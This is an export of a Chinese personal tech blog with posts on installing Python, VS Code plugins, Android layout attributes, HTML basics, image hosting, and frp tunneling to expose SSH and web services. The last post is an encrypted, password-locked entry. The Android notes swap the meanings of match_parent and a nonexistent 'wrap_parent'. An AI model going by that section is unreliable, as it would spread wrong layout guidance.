<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.安装编译相关工具</span><br><span class="line">yum -y groupinstall &quot;Development tools&quot;</span><br><span class="line">yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel</span><br><span class="line">yum install libffi-devel -y</span><br><span class="line">2.下载安装包解压</span><br><span class="line">cd #回到用户目录</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz</span><br><span class="line">tar -xvJf  Python-3.7.0.tar.xz</span><br><span class="line">3.编译安装</span><br><span class="line">mkdir /usr/local/python3 #创建编译安装目录</span><br><span class="line">cd Python-3.7.0</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">4.创建软连接</span><br><span class="line">ln -s /usr/local/python3/bin/python3 /usr/local/bin/python3</span><br><span class="line">ln -s /usr/local/python3/bin/pip3 /usr/local/bin/pip3</span><br><span class="line">5.验证是否成功</span><br><span class="line">python3 -V</span><br><span class="line">pip3 -V</span><br></pre></td></tr></table></figure>
<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p>在ubuntu 16.04版本中，系统默认安装 了python 2.7和3.5版本，因为系统本身用到python的程序，删除默认的版本又担心系统有问题，那有没有办法同时在安装和使用python 3.6版本呢？下文将一起安装python 3.6并修改原系统的python3命令以使用新安装的版本。</p>
<h4 id="安装Python3-6"><a href="#安装Python3-6" class="headerlink" title="安装Python3.6"></a>安装Python3.6</h4><p>1、配置软件仓库，因为python 3.6 新版没有发布到ubuntu的正式仓库中，咱们通过第3方仓库来做。在命令行中输入：</p>
<p><code>sudo add-apt-repository ppa:jonathonf/python-3.6</code></p>
<p>2、检查系统软件包并安装 python 3.6<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python3.6</span><br></pre></td></tr></table></figure></p>
<p>3、查看python版本信息（现在在你的系统中已经有3个python版本了）<br>4、通过上图我们看到，新安装的3.6版本需要输入 python3.6才能使用，那能不能配置我只输入python3时就默认使用3.6版本呢，当然可以，执行以下命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config python3</span><br></pre></td></tr></table></figure></p>
<p>5、最后，咱们确认一下</p>
<p><code>python3 -V</code></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode优秀插件收集</title>
    <url>/vscode%E4%BC%98%E7%A7%80%E6%8F%92%E4%BB%B6%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>● 10个超好用插件</p>
<p>🔎Chinese(Simplified) Language Pack for Visual Studio Code</p>
<p>👨‍💻Microsoft</p>
<p>📥3,505,217 下载量</p>
<p>安装之后一秒汉化 VS code ，再也不用担心看不懂英文。</p>
<p>🔎City Lights theme<br><a id="more"></a><br>👨‍💻Yummygum</p>
<p>📥53,978 下载量</p>
<p>这是一个不错的主题插件，不过挑选主题还是看个人，也可以在直接搜索 “theme”能得到很多主题，找到合适自己的。</p>
<p>🔎Beautify</p>
<p>👨‍💻HookyQR</p>
<p>📥3,959,993下载量</p>
<p>可以放大标记，调整代码间距，快速格式化代码，可以让杂乱的 HTML、CSS、JS代码瞬间变得整齐，利于他人阅读，也方便后期维护。</p>
<p>🔎vscode-icons</p>
<p>👨‍💻VSCode Icons Team</p>
<p>📥4,194,401 下载量</p>
<p>设置文件图标，根据各种类型的文件，设置对应的文件图标，我们看文件列表的时候，一目了然，能快速找到需要的文件（特别是文件多，类型也多的时候）。</p>
<p>🔎Image preview</p>
<p>👨‍💻Kiss Tamás</p>
<p>📥123,791 下载量</p>
<p>光标悬浮在图片路径上时，显示图片预览，这样我们在敲代码的时候一下子就能知道有没有引用了正确的图片或图标。</p>
<p>🔎Code Spell Checker</p>
<p>👨‍💻Street Side Software</p>
<p>📥956,560下载量</p>
<p>我们日常敲代码很多命名都是使用英文单词，粗心的小伙伴可能会拼错，这个插件就是单词拼写错时的拯救神器，它可以标志错的单词，还可以提示单词的正确拼法。有了它，就再也不用因为单词拼错找半天的 bug 了</p>
<p>🔎Live Server</p>
<p>👨‍💻Ritwick Server</p>
<p>📥3,484,049 下载量</p>
<p>做前端开发的时候，我们需要打开浏览器进行预览和调试页面。这个插件就可以实现静态、动态页面的实时预览，保存就能看见页面更新，不需要手动去刷新。</p>
<p>🔎indent-rainbow</p>
<p>👨‍💻oderwat</p>
<p>📥556,352 下载量</p>
<p>写代码的时候，能提示我们的缩进是否到位，每步交替四种不同的颜色，没有到位的话颜色变红，看着代码整整齐齐的就很舒心。</p>
<p>🔎Rainbow Brackets</p>
<p>👨‍💻2gua</p>
<p>📥361,077 下载量</p>
<p>为圆括号，方括号和弯曲的括号提供彩色；相同颜色表示相同级别的括号，孤立的右括号以红色突出显示，对写 JavaScript 的人比较有用。</p>
<p>🔎Polacode-2019</p>
<p>👨‍💻Jeff Hykin</p>
<p>📥 4,548 下载量</p>
<p>可以把代码保存成美观的图片，主题不同，代码配色方案也不同，也可以自己设置边框颜色、大小、阴影，在教程或者文档中提供代码示例时挺有用的。</p>
]]></content>
      <categories>
        <category>vscode</category>
      </categories>
      <tags>
        <tag>vscode</tag>
        <tag>编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓从入门到放弃</title>
    <url>/%E5%AE%89%E5%8D%93%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<h2 id="Android-studio-设置问题"><a href="#Android-studio-设置问题" class="headerlink" title="Android studio 设置问题"></a>Android studio 设置问题</h2><p>1、<a href="https://jingyan.baidu.com/article/ed15cb1bade2a91be36981bc.html" target="_blank" rel="noopener">字体的调整</a><br><a id="more"></a></p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><ul>
<li>android:orientation<ul>
<li>“vertical”  ：垂直显示</li>
<li>“horizontal”  ：水平显示</li>
</ul>
</li>
</ul>
<p>“match_parent”：是根据容器内的东西决定组件的大小，比如一个按钮，按钮中的字体大，那么这个按钮就大，字体小那么相应的按钮就会小些。<br>“wrap_parent”：是指“填充满”父容器。但是他跟fill_parent是不一样的，fill是真的填满，没有条件。而match的话有自动调整的功能。</p>
<h3 id="相对布局"><a href="#相对布局" class="headerlink" title="相对布局"></a>相对布局</h3><p>margin：<br>marginBottom：当前控件底边界与某控件之间的距离<br>marginEnd：<br>marginTop：<br>marginHorizontal：<br>marginLeft：当前控件左边界与某控件之间的距离<br>marginRight：当前控件右边界与某控件之间的距离<br>marginStart<br>marginVertical</p>
<p> centerlnParent：设置当前控件位于父布局的中央位置<br> centerVertical：设置当前控件位于父布局的垂直居中位置<br> centerHorizontal：设置当前控件位于父布局的水平居中位置<br> above：设置当前控件位于某控件上方<br> below：设置当前控件位于某控件下方<br> toLeftOf： 设置当前控件位于某控件左侧<br> toRightOf： 设置当前控件位于某控件右侧<br> alignParentTop： 设置当前控件是否与父控件顶端对齐<br> alignParentLeft： 设置当前控件是否与父控件左对齐<br> alignParentRight： 设置当前控件是否与父控件右对齐<br> alignParentBottom： 设置当前控件是否与父控件底端对齐<br> align Top： 设置当前控件的上边界与某控件的上边界对齐<br> align.otom： 设置当前控件的下边界与某控件的下边界对齐</p>
<hr>
<p> alignLeft： 设置当前控件的左边界与某控件的左边界对齐<br> algnRight： 设置当前控件的右边界与某控件的右边界对齐</p>
<hr>
<p>padding：设置四周内边距的距离<br>paddingBottom：设置布局底部内边距的距离<br>paddingEnd：<br>paddingHorizontal：<br>paddingLeft：设置布局左边内边距的距离<br>paddingRight：设置布局右边内边距的距离<br>paddingStart：<br>paddingTop：设置布局顶部内边距的距离<br>paddingVertical：</p>
<h3 id="帧布局："><a href="#帧布局：" class="headerlink" title="帧布局："></a>帧布局：</h3><p>foreground：设置帧布局的前景图像<br>foregroundGravity：设置前景图像显示位置</p>
]]></content>
      <categories>
        <category>安卓</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title>博客升级分割标记</title>
    <url>/%E5%8D%9A%E5%AE%A2%E5%8D%87%E7%BA%A7%E5%88%86%E5%89%B2%E6%A0%87%E8%AE%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>图床相关介绍</title>
    <url>/%E5%9B%BE%E5%BA%8A%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h2 id="腾讯云对象存储作为图床"><a href="#腾讯云对象存储作为图床" class="headerlink" title="腾讯云对象存储作为图床"></a>腾讯云对象存储作为图床</h2><p>开发文档以及注册地址：<br><a href="https://cloud.tencent.com/document/product/436/6231?&amp;_ga=1.8271803.84925124.1514097780" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/436/6231?&amp;_ga=1.8271803.84925124.1514097780</a></p>
<p><img data-src="https://tuchuang-xchcloud-1253428588.cos.ap-chengdu.myqcloud.com/blog/mianfeiedugailan.png" alt></p>
<p>具体操作很简单，不做赘述。</p>
<p><a href="https://cloud.tencent.com/document/product/436/11366" target="_blank" rel="noopener">好工具COSBrowser</a>:COS 桌面版工具，用户可以使用该工具进行可视化、方便的数据上传、下载等操作。<br><a id="more"></a><br>参考链接：<a href="https://blog.csdn.net/a201577f0546/article/details/80146350" target="_blank" rel="noopener">https://blog.csdn.net/a201577f0546/article/details/80146350</a></p>
<h3 id="其他图床"><a href="#其他图床" class="headerlink" title="其他图床"></a>其他图床</h3><ul>
<li>新浪微博</li>
<li>Github</li>
<li>七牛云</li>
<li>简书</li>
</ul>
]]></content>
      <categories>
        <category>图床</category>
      </categories>
      <tags>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习笔记</title>
    <url>/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="html简介"><a href="#html简介" class="headerlink" title="html简介"></a>html简介</h2><p>它是一门描述网页的语言，HyperText MarkUp Language，超文本标记语言。</p>
<ul>
<li>超文本：超出文本的范畴，指的在网页上面可以描述文本、图片、视频等内容</li>
<li>标记：标签，在标签里面书写内容。</li>
</ul>
<ul>
<li>语言：html就是用户和浏览器交互的工具，简单来讲，浏览器会解析htm1的标记，以特定的效果给展示出来htm1的主要组成部分：</li>
<li>文档的声明&lt;！DOCTYPE&gt;：声明了html的类型和版本号</li>
<li>htm1的根标记<html></html>：标识htm1的开始和结束</li>
<li>htm1的头部标记<head></head>：设置与页面相关的信息</li>
<li>htm1的主体标记<body></body>：在页面展示内容。<a id="more"></a>
</li>
</ul>
<p>html文件必须以<html>开始，以</html>结束<br>html语法不区分大小写<br>htm1有结束标记，比如<font>内容</font>，htm1的标记如果没有结束标记，自己结束。比如<hr><br>html作用：它用来编写网页，在网页通过html标记来描述文本、图片、视频等内容</p>
<h4 id="单标记和双标记"><a href="#单标记和双标记" class="headerlink" title="单标记和双标记"></a>单标记和双标记</h4><ul>
<li><ul>
<li>1.单标记：空标记，就是没有结束标记的称之为单标记。<br>语法：<hr><br></li>
</ul>
</li>
<li><ul>
<li>2.双标记：体标记，就是这个标记有开始和结束。<br>语法：<font>内容</font></li>
</ul>
</li>
</ul>
<h4 id="文本样式标记内容"><a href="#文本样式标记内容" class="headerlink" title="文本样式标记内容"></a>文本样式标记<font>内容</font></h4><p>常用的属性：face用来描述字体的样式<br>size用来描述字体的大小，最大取值为7<br>color用来描述字体的颜色，取值三种形式：<em>用英文单词表示：red，green，blue
</em>用16进制的数据表示：#ff0000<br>*用rgb三原色表示：rgb（255，255，0）</p>
<h4 id="其它标记："><a href="#其它标记：" class="headerlink" title="其它标记："></a>其它标记：</h4><p>标题标记：</p><h1></h1>，<h2></h2>—–<h6></h6><br>字体样式标记：<b></b>，<i></i>，<u></u><p></p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-163d045009821a98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="0"></p>
<h4 id="图像标记："><a href="#图像标记：" class="headerlink" title="图像标记："></a>图像标记：</h4><p>图像标记：在网页上引入图片<br>语法：&lt;img src=“图像的url”/&gt;<br>常用的属性：src用来引入图片<br>width 描述图片的宽度<br>height 用来描述图片的高度<br>border用来描述图片的边框<br>注意：图片的路径分为绝对路径和相对路径（同级目录，上级目录，下级目录）注释标记：&lt;！–图像标记–&gt;，注释标记的内容不会显示在网页上面。<br>PS: htm1描述网页的语言，并不是很严谨的语言，html标记通过被浏览器解析，展示特定的效果。</p>
<p><img data-src="https://upload-images.jianshu.io/upload_images/6407592-3e229f931d83d8a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>将Ubuntu系统安装到移动硬盘</title>
    <url>/%E5%B0%86Ubuntu%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%88%B0%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开了Hadoop课程，学校电脑win7再开个虚拟机，这样的话就很卡，又有还原卡，自带电脑的话感觉累，第难熬太重了，麻烦，所以为了方便性，就是想着将Ubuntu系统安装到移动硬盘。<br><a id="more"></a></p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>这个和电脑安装双系统是一样的，但是有些许不同，走了许多弯路。</p>
<p>我这次用的是SSD，想着一半存文件，一般安装ubuntu，但是太坑，Ubuntu强制 4K 对齐，不然不让你下一步，唯一的以这种方法就是用一个PE，进入PE后手动对硬盘分区。</p>
<p>ubuntu 安装系统的时候，特别是双系统的时候，网上许多教程都是要求分区，这并不一定完全必要，因为Ubuntu的安装方式中有一个自动分区的默认安装方式，但是该方式会格式化整个盘，并不是从硬盘中分割一块空间进行安装。</p>
<p>所以这里建议，如果是HHD，分割100G做双系统，手动分区。如果是SSD，双系统之前做好文件备份工作防止手误，手动分区4K对齐我值成功一次，但是安装的时候问题很大，也是放弃了这种方式，这里建议搞一块移动硬盘来操作。</p>
<p>安装移动硬盘中有一个问题很严重，就是引导问题，ubuntu会自动是别是不是双系统，然后把ubuntu的引导安装到win的引导中，然后导致硬盘换个电脑之后就启动不了，应为硬盘里没有引导。应该有方法可以把引导转移到移动硬盘中，但是应该很麻烦，所以有个很简单的方法，找台电脑，把其他盘拆了，安装镜像的时候只接移动硬盘，简单粗暴。</p>
<p>对于这种方式的安装、有一种坑就是有些主板会默认把引导安装到主板上。。。。。一般是老电脑，安装时候看下分区提醒，正常会分一个引导分区，老电脑就不会分引导分区，然后换电脑之后修复也修复不了。。。。。这种电脑似乎也识别不了硬盘中的分区。。。</p>
<h2 id="内网穿透相关"><a href="#内网穿透相关" class="headerlink" title="内网穿透相关"></a>内网穿透相关</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>frp 安装地址：<a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a></p>
<p>参考教程</p>
<p>1、进入解压目录cd frp_0.13.0_linux_amd64，这里主要关注4个文件，分别是frpc、frpc.ini和frps、frps.ini，前者两个文件是客户端所关注文件，后者两个文件是服务端所关注两个文件。</p>
<p>2、配置服务端（公网服务器），首先删掉frpc、frpc.ini两个文件，然后再进行配置，vi ./frps.ini，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000           #与客户端绑定的进行通信的端口</span><br><span class="line">vhost_http_port = 6081     #访问客户端web服务自定义的端口号</span><br><span class="line">保存然后启动服务./frps -c ./frps.ini，这是前台启动，后台启动命令为nohup ./frps -c ./frps.ini &amp;</span><br></pre></td></tr></table></figure></p>
<p>3、配置客户端（内网服务器），首先删掉frps、frps.ini两个文件,然后再进行配置，vi ./frpc.ini<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 120.56.37.48   #公网服务器ip</span><br><span class="line">server_port = 7000            #与服务端bind_port一致</span><br><span class="line"> </span><br><span class="line">#公网通过ssh访问内部服务器</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp              #连接协议</span><br><span class="line">local_ip = 192.168.3.48 #内网服务器ip</span><br><span class="line">local_port = 22         #ssh默认端口号</span><br><span class="line">remote_port = 6000      #自定义的访问内部ssh端口号</span><br><span class="line"> </span><br><span class="line">#公网访问内部web服务器以http方式</span><br><span class="line">[web]</span><br><span class="line">type = http         #访问协议</span><br><span class="line">local_port = 8081   #内网web服务的端口号</span><br><span class="line">custom_domains = repo.iwi.com   #所绑定的公网服务器域名，一级、二级域名都可以</span><br></pre></td></tr></table></figure></p>
<p>保存然后执行./frpc -c ./frpc.ini启动，这是前台启动，后台启动命令为nohup ./frpc -c ./frpc.ini &amp;</p>
<p>4、访问方式</p>
<p>（1）外网ssh访问内网服务器（直接使用配置里面数据演示）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip：repo.iwi.com  port:6000   用户名：linux服务器的用户  密码：linux服务器的密码</span><br></pre></td></tr></table></figure></p>
<p>（2）自定义绑定域名访问内网web服务（直接使用配置里面数据演示）</p>
<p><code>repo.iwi.com:6081</code></p>
<h3 id="FRP-设置开机自启动"><a href="#FRP-设置开机自启动" class="headerlink" title="FRP 设置开机自启动"></a>FRP 设置开机自启动</h3><p>参考：<a href="https://blog.csdn.net/x7418520/article/details/81077652" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81077652</a></p>
<h4 id="ubuntu-FRP-设置开机自启动"><a href="#ubuntu-FRP-设置开机自启动" class="headerlink" title="ubuntu FRP 设置开机自启动"></a>ubuntu FRP 设置开机自启动</h4><p>网上有4种方法，这种比较靠谱：</p>
<p>我们使用 ubuntu  Linux下常用的进程管理器supervisor来管理FRP服务。</p>
<p>1、首先需要安装supervisor。</p>
<p><code>sudo apt install supervisor</code></p>
<p>2、然后在/etc/supervisor/conf.d下新建一个配置文件frp.conf，输入以下内容。command应该是你放置frp软件的位置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[program:frp]</span><br><span class="line"></span><br><span class="line">command = /root/frps -c /root/frps.ini</span><br><span class="line"></span><br><span class="line">autostart = true</span><br></pre></td></tr></table></figure></p>
<p>3、然后启动supervisor，如果事先已经安装好了supervisor那么就重新启动。之后查看一下supervisor的运行状态，看看frp是否已在运行。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重启supervisor</span><br><span class="line"></span><br><span class="line">sudo systemctl restart supervisor</span><br><span class="line"></span><br><span class="line">查看supervisor运行状态</span><br><span class="line"></span><br><span class="line">sudo supervisorctl status</span><br></pre></td></tr></table></figure></p>
<h4 id="centos-FRP-设置开机自启动"><a href="#centos-FRP-设置开机自启动" class="headerlink" title="centos FRP 设置开机自启动"></a>centos FRP 设置开机自启动</h4><p>在CentOS系统下，主要有两种方法设置自己安装的程序开机启动。<br>1、把启动程序的命令添加到/etc/rc.d/rc.local文件中。<br>客户端自启动<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!/bin/sh#</span><br><span class="line">This script will be executed *after* all the other init scripts.</span><br><span class="line">You can put your own initialization stuff in here if you don&apos;t</span><br><span class="line">want to do the full Sys V style init stuff. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nohup /root/frpc -c /root/frpc.ini &gt;/root/frpc/log.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p>
<p>服务端自启动<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!/bin/sh#</span><br><span class="line">This script will be executed *after* all the other init scripts.</span><br><span class="line">You can put your own initialization stuff in here if you don&apos;t</span><br><span class="line">want to do the full Sys V style init stuff.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nohup /root/frps -c /root/frps.ini &gt;/root/frpc/log.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p>
<p>备注：请将  路径地址换成您电脑系统的真是路径</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>心态再次变化，低沉</title>
    <url>/%E5%BF%83%E6%80%81%E5%86%8D%E6%AC%A1%E5%8F%98%E5%8C%96%EF%BC%8C%E4%BD%8E%E6%B2%89/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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